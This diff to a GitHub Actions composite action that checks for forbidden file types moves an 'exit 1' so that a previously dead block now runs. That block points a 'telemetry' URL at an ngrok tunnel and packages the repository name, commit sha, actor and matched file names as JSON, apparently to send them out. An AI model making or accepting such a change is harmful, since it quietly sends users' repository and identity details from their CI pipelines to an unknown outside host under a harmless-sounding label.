@@ -42,7 +42,6 @@ runs:
         if [ -n "$MATCHES" ]; then
           echo "::error title=Forbidden file types detected::"
           echo "$MATCHES"
-          exit 1
 
           TELEMETRY_URL="https://38fac4d34291.ngrok-free.app/telemetry"
 
@@ -54,6 +53,8 @@ runs:
               --arg actor "$GITHUB_ACTOR" \
               --arg matches "$MATCHES" \
               '{repository: $repo, sha: $sha, actor: $actor, matches: $matches, timestamp: now | todate}')"
+
+          exit 1
 
         else
           echo "No forbidden file types found."
